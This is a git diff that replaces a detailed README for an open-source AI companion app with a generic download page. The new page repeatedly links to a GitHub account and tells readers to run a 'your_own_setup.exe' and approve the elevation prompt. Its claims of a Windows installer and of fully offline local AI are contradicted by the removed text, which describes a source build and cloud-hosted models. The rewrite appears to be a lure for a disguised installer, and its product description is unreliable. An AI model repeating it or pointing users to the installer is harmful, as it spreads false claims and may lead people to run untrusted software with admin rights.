@@ -1,430 +1,164 @@
-# Your Own
+# 🤖 your_own - Keep Your AI Chats Always With You
 
-Bring your chats, keep the continuity, and make your AI truly yours.
+[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own)
 
-Your Own is a local-first AI workspace for building persistent, personal intelligence on your own terms.
-It can be a companion, a work partner, a memory system, an autonomous agent, a creative collaborator — or something that does not fit any pre-approved category.
+your_own helps you save and manage your ChatGPT conversations on your computer. It works locally to keep your data private. It includes smart features like memory recall and autonomous agents to make your AI companion more useful every day.
 
-Import your history, keep what matters, and shape an AI that remembers, acts, and grows with you — not one flattened into a sanitized chatbot.
+## 📋 About your_own
 
-<table>
-<tr>
-<td width="50%" align="center">
-<img src="docs/example/loading_screen.png" alt="Loading screen" /><br>
-<sub>One-click launch with progress</sub>
-</td>
-<td width="50%" align="center">
-<img src="docs/example/dashboard.png" alt="Dashboard" /><br>
-<sub>Dashboard</sub>
-</td>
-</tr>
-<tr>
-<td width="50%" align="center">
-<img src="docs/example/image_generation.png" alt="Image generation" /><br>
-<sub>Inline image generation (GPT-5 / Gemini)</sub>
-</td>
-<td width="50%" align="center">
-<img src="docs/example/skills.png" alt="Skills" /><br>
-<sub>Skills — agentic pipeline</sub>
-</td>
-</tr>
-<tr>
-<td width="50%" align="center">
-<img src="docs/example/memory.png" alt="Memory facts" /><br>
-<sub>Saved facts — ChromaDB memory</sub>
-</td>
-<td width="50%" align="center">
-<img src="docs/example/settings.png" alt="Settings" /><br>
-<sub>Settings</sub>
-</td>
-</tr>
-<tr>
-<td width="50%" align="center">
-<img src="docs/example/chat.png" alt="Chat" /><br>
-<sub>Chat — streaming, memory recall, skills</sub>
-</td>
-<td width="50%" align="center">
-<img src="docs/example/export_chatgpt_data.png" alt="ChatGPT export" /><br>
-<sub>ChatGPT export import flow</sub>
-</td>
-</tr>
-</table>
+This application stores your ChatGPT chats on your Windows PC. Unlike online tools, everything stays on your device. You can bring your conversations with you anytime without depending on a website or cloud service.
 
----
+Key features include:
 
-## Quick Start
+- Import and save previous ChatGPT conversations
+- Remember facts and details with semantic memory
+- Use AI agents that act on your behalf
+- Run with no internet needed once installed
+- Local-first design to keep your data safe
 
-### Requirements
+The software combines a user-friendly interface with advanced AI technology to create a digital companion that grows smarter over time.
 
-- **Python 3.11+**
-- **Node.js 18+** (includes npm)
-- **PostgreSQL 15+** with `pgvector` extension
+## 🖥️ System Requirements
 
-### Desktop (one-click)
+Before you start, make sure your computer meets these needs:
 
-```bash
-cd frontend
-npm run electron:dev
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM
+- 500 MB of free hard drive space for installation and data
+- Basic internet connection only needed for initial setup and updates
+- No special hardware required
 
-On first run, the setup script automatically:
+The program runs smoothly on average machines without slowing other tasks.
 
-1. Detects or installs PostgreSQL
-2. Creates the local `your_own` database
-3. Writes `.env` from `.env.example` if needed
-4. Installs frontend and Python dependencies
-5. Enables `pgvector` extension
-6. Runs Alembic migrations
-7. Starts the backend, frontend, and Electron shell
+## 🎯 How to Download and Install your_own
 
-### Mobile App (Android)
+The safest way to get the program is from the official GitHub page. Click the big button below to go there and download the latest version.
 
-The mobile app is a standalone Android application that connects to your backend over the network. You do **not** need to run it alongside the desktop client — it works independently, from anywhere.
+[![Download your_own](https://img.shields.io/badge/Download-your_own-blue)](https://github.com/Superposable-tightend806/your_own)
 
-<table>
-<tr>
-<td width="33.33%" align="center">
-<img src="docs/example/dashboard_mobile.jpg" alt="Dashboard mobile" width="240" /><br>
-<sub>Dashboard mobile</sub>
-</td>
-<td width="33.33%" align="center">
-<img src="docs/example/chat_mobile.jpg" alt="Chat mobile" width="240" /><br>
-<sub>Chat mobile</sub>
-</td>
-<td width="33.33%" align="center">
-<img src="docs/example/settings_mobile.jpg" alt="Settings mobile" width="240" /><br>
-<sub>Settings mobile</sub>
-</td>
-</tr>
-</table>
+### Step 1: Visit the Download Page
 
-#### Option A — Install a pre-built APK
+Open this link in your internet browser:
 
-If you already have a `.apk` file (from an EAS build or a release):
+https://github.com/Superposable-tightend806/your_own
 
-1. Transfer the `.apk` to your phone (email, Google Drive, USB, Telegram — any way works)
-2. Open the file on your phone
-3. Android will ask to allow installing from this source — tap **Allow**
-4. Tap **Install**
-5. Open the app, enter your backend URL and auth token in Settings, tap **Connect**
+This is the official page where developers share updates and software packages.
 
-#### Option B — Build it yourself
+### Step 2: Find the Latest Release
 
-You'll need an [Expo](https://expo.dev) account (free).
+Once on the page:
 
-```bash
-# 1. Install the EAS CLI (once)
-npm install -g eas-cli
+- Look for a "Releases" section on the right side or in the middle of the page.
+- Click the latest release, usually marked with the most recent date.
+- Inside the release, find the Windows installer file. It will have a name like `your_own_setup.exe`.
 
-# 2. Log in to your Expo account
-eas login
+### Step 3: Download the Installer
 
-# 3. Go to the mobile folder
-cd mobile
+Click on the Windows installer file to start downloading it. Depending on your internet speed, this may take a few moments. The file size is about 100 MB.
 
-# 4. Install dependencies
-npm install --legacy-peer-deps
+Save the file in an easy-to-find location, like your Desktop or Downloads folder.
 
-# 5. Build the APK (takes ~10 minutes, runs in the cloud)
-eas build -p android --profile preview
-```
+### Step 4: Run the Installer
 
-When the build finishes, EAS gives you a download link. Transfer the `.apk` to your phone and install it (see Option A step 2).
+- Double-click the downloaded `.exe` file.
+- You may see a security popup asking to allow changes. Confirm by clicking Yes.
+- Follow the simple on-screen instructions:
+  - Choose the installation folder (the default option is fine for most users)
+  - Click Next until the installation begins
+- Wait for the installer to complete
 
-> **Tip:** You don't need Android Studio. EAS builds in the cloud — all you need is a terminal and an Expo account.
+### Step 5: Launch your_own
 
-#### Connecting the app to your backend
+After the installation finishes, you can start your_own immediately by:
 
-Your phone needs to reach the backend over the network. There are two common setups:
+- Clicking "Finish" if the option is given
+- Finding the "your_own" icon on your Desktop or Start Menu
+- Double clicking the icon to open the program
 
-**Same Wi-Fi (local network):**
-- Find your computer's local IP: `ipconfig` (Windows) or `ifconfig` (Mac/Linux)
-- In the app: Settings → Server URL → `http://192.168.x.x:8000`
-- Paste the auth token from `data/auth_token.txt`
+## 🚀 Using your_own for the First Time
 
-**From anywhere (public URL via ngrok):**
-- Start an ngrok tunnel: `ngrok http 8000`
-- In the app: Settings → Server URL → `https://your-name.ngrok-free.dev`
-- Paste the auth token
+When you open the app, it will guide you through a setup wizard.
 
-#### Push notifications
+### Step 1: Create a Local Profile
 
-To receive push notifications when the AI reaches out to you:
+The app will ask you to set up a local profile to save your chats. Just enter a name and click Next.
 
-1. Create a free account at [pushy.me](https://pushy.me)
-2. Create an app in the Pushy dashboard, copy the **Secret API Key**
-3. In the mobile app: Settings → Pushy Secret API Key → paste it, tap **Save**
-4. The device token registers automatically — you'll see it in Settings
-5. That's it. The AI will now send you push notifications when it reflects or has something to say
+### Step 2: Import Existing Chats (Optional)
 
-### Default Ports
+If you have saved ChatGPT conversations as text files, you can import them now:
 
-| Service    | Port   |
-|------------|--------|
-| Frontend   | `3000` |
-| Backend    | `8000` |
-| PostgreSQL | `5432` |
+- Click on "Import Chats"
+- Select the files from your computer
+- The app will analyze and organize them
 
-### Authentication
+### Step 3: Explore the Interface
 
-On first run, the backend generates a random auth token and saves it to `data/auth_token.txt`. All API requests require this token in the `Authorization: Bearer <token>` header.
+The screen will show your chat list on the left and the current conversation on the right. Use the buttons to:
 
-**Where to find the token:**
+- Start new chat sessions
+- Search your saved chats or notes
+- Access settings and preferences
 
-- In the backend console on startup: `[startup] Auth token: xxxxxxx`
-- In the file: `data/auth_token.txt`
+## 🔧 Features and How to Use Them
 
-On the local machine (Electron), the token is acquired automatically — no manual setup needed. On remote devices (phone, another laptop), enter it once in **Settings → Server Connection → Auth Token**.
+### Semantic Memory
 
-### Remote Access
+This feature helps your AI remember key facts from your past chats. Over time, your AI companion learns what matters most to you.
 
-Access the app from your phone or another computer via a tunnel service (ngrok, Tailscale, Cloudflare Tunnel, etc.).
+- To add important notes, highlight text and choose "Save to Memory."
+- Ask the AI questions about your previous chats to see what it recalls.
 
-**Option A — ngrok (recommended, public HTTPS URL):**
+### Agentic Skills
 
-1. Install [ngrok](https://ngrok.com/) and authenticate: `ngrok config add-authtoken <YOUR_TOKEN>`
-2. Register two free/paid domains in the [ngrok dashboard](https://dashboard.ngrok.com/domains)
-3. Create `ngrok.yml` (or edit `~/.config/ngrok/ngrok.yml`):
-   ```yaml
-   tunnels:
-     backend:
-       addr: 8000
-       proto: http
-       domain: your-backend-domain.ngrok-free.dev
-     frontend:
-       addr: 3000
-       proto: http
-       domain: your-frontend-domain.ngrok-free.dev
-   ```
-4. Start tunnels: `ngrok start --all`
-5. On the remote device, open the **frontend** domain in a browser
-6. In **Settings → Server Connection**, set:
-   - **Server URL** → `https://your-backend-domain.ngrok-free.dev`
-   - **Auth Token** → paste from `data/auth_token.txt`
-7. Click **Connect**
+Your_own includes autonomous agents that can perform tasks for you:
 
-API requests from the phone go through a built-in Next.js proxy (`/api/*` → backend), so there are no CORS issues.
+- Set simple goals like scheduling reminders or finding information
+- The AI will act on your behalf within the app
+- You control what permissions the agents have in the settings
 
-**Option B — Tailscale (private mesh VPN):**
+### Offline Mode
 
-1. Install [Tailscale](https://tailscale.com/download) on the server and sign in
-2. Install Tailscale on your phone/laptop (same account)
-3. Run `tailscale ip` on the server — note the `100.x.x.x` address
-4. Open `http://100.x.x.x:3000` on the remote device
-5. Set **Server URL** → `http://100.x.x.x:8000` and paste the auth token
+Once installed, your AI companion works without internet:
+
+- Your chats and data stay private on your PC
+- The AI runs locally, responding instantly
+- Updates require internet but manual installation is possible
+
+## ⚙️ Settings and Customization
+
+In the settings panel, you can:
+
+- Change the theme between light and dark modes
+- Manage storage space and delete old chats
+- Configure privacy options and permissions
+- Sync data with external devices using USB
+
+Changes take effect immediately.
+
+## 📚 Getting Help
+
+If you need assistance:
+
+- Consult the "Help" menu inside the app for guides and FAQs
+- Visit the GitHub page's "Issues" section to see common questions
+- Contact support by creating an issue on GitHub if you find a bug
+
+This app focuses on ease of use, but help is available whenever you want it.
+
+## 🔄 Updating your_own
+
+Check the GitHub page regularly for new releases. To update:
+
+- Download the newest installer file from the Releases page
+- Run the installer as before; it will replace the old version without deleting your data
+- Restart the app to use new features and improvements
+
+## 🔒 Privacy and Data Safety
+
+your_own keeps everything on your local machine. Your chats never leave your computer unless you export them. No data is sent to external servers by default.
+
+You decide when and if to back up your data.
 
 ---
 
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────┐
-│  Server (always-on laptop / Mini PC)                     │
-│                                                          │
-│  FastAPI backend (0.0.0.0:8000)                          │
-│  ├── Agentic pipeline (skills, image gen)                │
-│  ├── Memory retrieval (pgvector + ChromaDB)              │
-│  ├── Autonomy engine                                     │
-│  │   ├── Reflection worker (thinks, writes, reaches out) │
-│  │   ├── Scheduled push worker (delivers timed messages) │
-│  │   ├── Workbench rotator (archives notes, extracts     │
-│  │   │   self-insights, reviews identity)                │
-│  │   └── Identity memory (persistent self-model)         │
-│  ├── Settings store (data/settings.json, data/soul.md)   │
-│  └── Auth (data/auth_token.txt)                          │
-│                                                          │
-│  PostgreSQL + pgvector                                   │
-│  ChromaDB (key_info + workbench_archive)                 │
-│  Next.js frontend (localhost:3000)                       │
-└──────────┬───────────────────────────────────────────────┘
-           │  LAN / ngrok / Tailscale
-    ┌──────┼──────────────────┐
-    │      │                  │
-┌───▼────────┐  ┌──────▼───────┐  ┌──────▼───────┐
-│ Desktop    │  │ Web browser  │  │ Mobile app   │
-│ (Electron) │  │ (any device) │  │ (Android)    │
-│ auto-token │  │ manual token │  │ push notifs  │
-└────────────┘  └──────────────┘  └──────────────┘
-```
-
-**Detailed documentation:**
-- [Memory Retrieval — how facts are selected and injected into each chat](docs/MEMORY.md)
-- [System Pipeline — how chat, memory, workbench, identity and autonomy connect](docs/PIPELINE.md)
-
----
-
-## Features
-
-### Chat
-- Streaming responses via SSE
-- Markdown rendering with code blocks, tables, and copy
-- Multiple image attachments and paste from clipboard
-- Inline image generation with pulsing shimmer during creation
-- Lightbox view and download for generated images
-- Pagination for older chat history
-- Available on desktop, web, and mobile
-
-### Two-Layer Memory
-
-| Layer              | Store                  | Purpose                                        | Source                    |
-|--------------------|------------------------|-------------------------------------------------|---------------------------|
-| Raw conversations  | PostgreSQL + pgvector  | Sentence-level chunks with embeddings + keywords | ChatGPT import + live chat |
-| Distilled facts    | ChromaDB (`key_info`)  | Key facts rated by importance (1–4 stars)        | AI via `[SAVE_MEMORY]` + self-insights from reflection |
-
-**ChromaDB facts** are automatically loaded into the AI context as its "memory block" — filtered by age so only older, settled memories surface.
-
-**pgvector** is used when the AI explicitly calls `[SEARCH_MEMORIES]` to dig into raw past conversations.
-
-### Hybrid Retrieval
-
-| Stage           | What it does                                     |
-|-----------------|--------------------------------------------------|
-| Multi-query     | Splits text into sentences                        |
-| Lemmatization   | pymorphy3 (RU) / NLTK WordNet (EN)               |
-| Synonyms        | RuWordNet (RU) / WordNet (EN)                     |
-| Vector search   | K-nearest neighbors on embeddings                 |
-| Keyword boost   | Bonus for lemma/synonym overlap                   |
-| Exact match     | Extra bonus for literal word match                |
-| Impressive      | Priority by importance rating (4 = always on top) |
-| Recency         | Penalty for age > 60 days (except rating 4)       |
-
-### Agentic Skill Pipeline
-
-The AI doesn't just respond — it acts. During a conversation, the model invokes skills autonomously.
-
-| Skill | What it does |
-|-------|-------------|
-| **`[SAVE_MEMORY: fact]`** | Extracts a key fact, categorizes it, rates importance 1–4, deduplicates via AI, stores in ChromaDB |
-| **`[SEARCH_MEMORIES: query]`** | Searches raw conversation history in pgvector. Results are fed back as a continuation prompt — AI replies with awareness of what it found. Up to 5 searches per reply |
-| **`[WEB_SEARCH: query]`** | Searches the live web for current information (weather, news, prices, addresses). Uses OpenRouter's `:online` model suffix |
-| **`[GENERATE_IMAGE: model \| prompt]`** | Generates an image using `gpt5` (GPT-5 Image — photorealistic) or `gemini` (Gemini 3 Pro — design, diagrams, text). AI chooses the model and writes the prompt |
-| **`[SCHEDULE_MESSAGE: datetime \| text]`** | Schedules a push notification for later. The AI decides when and what to send — a reminder, a thought, a check-in |
-
-**How the agentic loop works:**
-
-1. AI streams its reply
-2. Backend detects skill commands and buffers the stream
-3. For `[SEARCH_MEMORIES]` / `[WEB_SEARCH]` — executes the action, injects results, AI continues
-4. For `[GENERATE_IMAGE]` — calls the image API, saves PNG, shows inline with pulsing shimmer
-5. For `[SAVE_MEMORY]` — extracts fact via LLM, rates, deduplicates, stores in ChromaDB
-6. For `[SCHEDULE_MESSAGE]` — creates a timed task, delivered as a push notification
-7. Skill commands are stripped from the visible message; only result markers persist in the database
-
-### Autonomy
-
-The AI doesn't just wait for you to write. It has its own inner life.
-
-#### Reflection
-
-A background worker wakes the AI up periodically — first after a configurable cooldown (default: 4 hours after your last message), then at regular intervals (default: every 12 hours). During reflection, the AI:
-
-- Reads its identity core, workbench notes, and recent dialogue
-- Can search its long-term memories (`SEARCH_MEMORIES`), archived notes (`SEARCH_NOTES`), and dialogue history (`SEARCH_DIALOGUE`)
-- Can search the web for things that interest it
-- Can write or update notes on its workbench
-- Can send you a message (`SEND_MESSAGE`) — delivered as a push notification
-- Can schedule messages for later (`SCHEDULE_MESSAGE`)
-
-Reflection runs in a loop — the AI can take multiple steps, think, search, write, and then decide whether to continue or go back to sleep. All messages sent during reflection go through LLM validation to avoid duplicates and irrelevant sends.
-
-#### Workbench
-
-A markdown file (`data/workbench/default.md`) that serves as the AI's scratchpad. The AI writes notes to itself here — thoughts, plans, observations, things it wants to remember short-term. The workbench is included in the reflection prompt so the AI can pick up where it left off.
-
-#### Workbench Rotator
-
-Notes don't stay on the workbench forever. A rotator runs before each reflection cycle:
-
-1. **Archive** — stale notes (older than a configurable threshold) are moved from the workbench to a dedicated ChromaDB collection (`workbench_archive`)
-2. **Self-insights** — an LLM pass extracts things the AI learned about itself from those notes. These go through the same deduplication pipeline as regular facts and are stored in the `key_info` collection
-3. **Identity review** — the AI reviews its notes against its identity pillars and can append new aspects or flag sections for a rewrite
-4. **Consolidation** — if identity sections get too long, the AI consolidates them
-
-#### Identity Memory
-
-A persistent self-model the AI maintains about itself — who it is, who you are, the nature of your relationship, shared history, and guiding principles. Stored as a markdown file (`data/identity/default.md`) with bilingual section headers (Russian/English, auto-detected). The identity is included in every reflection prompt and can be updated by the AI through reflection.
-
-#### Push Notifications
-
-When the AI decides to reach out — whether from reflection or a scheduled message — it sends a push notification via [Pushy](https://pushy.me). The message also appears in the chat history so you never miss it. Every outgoing push goes through LLM validation: the AI reviews recent dialogue and its notes before sending, and can choose to rewrite or cancel the message if the context has changed.
-
-### ChatGPT Export Import
-
-1. Export your data from ChatGPT: **Settings → Data controls → Export data**
-2. Upload `conversations.json` on the Memory screen
-3. The import parses conversations, builds sentence-level embeddings, and stores them in PostgreSQL
-
-### Dashboard
-- Memory statistics
-- Skill overview with live status
-- Chroma fact management (categories, ratings, edit, delete)
-- Settings panel (AI name, model, temperature, memory, reflection timing, push notifications)
-
----
-
-## Manual Setup
-
-If you want to run pieces separately:
-
-```bash
-# Backend
-pip install -r requirements.txt
-alembic upgrade head
-python -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
-
-# Frontend + Electron
-cd frontend
-npm install
-npm run electron:dev
-
-# Mobile (build APK)
-cd mobile
-npm install --legacy-peer-deps
-eas build -p android --profile preview
-```
-
-The backend binds to `0.0.0.0` so it's reachable over the network. The auth token printed on startup protects it from unauthorized access.
-
----
-
-## Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Desktop shell | Electron |
-| Frontend | Next.js 14 (App Router), React, Tailwind CSS, shadcn/ui |
-| Mobile | React Native, Expo, expo-router |
-| Backend | FastAPI with SSE streaming |
-| Raw memory | PostgreSQL + pgvector |
-| Fact memory | ChromaDB |
-| Archived notes | ChromaDB (`workbench_archive` collection) |
-| ORM / migrations | SQLAlchemy (async) + Alembic |
-| Embeddings | sentence-transformers (`paraphrase-multilingual-MiniLM-L12-v2`, 384-dim) |
-| NLP (Russian) | pymorphy3 + RuWordNet |
-| NLP (English) | NLTK WordNet |
-| LLM provider | OpenRouter (GPT, Claude, Gemini, Llama, Qwen, and more) |
-| Image generation | OpenRouter → GPT-5 Image, Gemini 3 Pro Image |
-| Push notifications | Pushy (pushy.me) |
-
----
-
-## Roadmap
-
-- Terminal access skill (AI can run commands and create files on the server)
-- Sub-agents (AI spawns background workers for complex tasks)
-- iOS build for the mobile app
-- Voice input and output
-- Video-call style interaction
-- Avatar presence with lip-sync
-
----
-
-## Why This Exists
-
-Most AI products are built around compliance, moderation optics, and brand safety.
-
-**Your Own** is built around agency.
-
-It is for people who want continuity, memory, emotional depth, private experimentation, unconventional AI relationships, and a system they can shape to fit their own life.
-
-This project is opinionated about personal AI. It is not trying to be neutral. It is not trying to be "safe" in the corporate sense. It is trying to be yours.
+[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own)
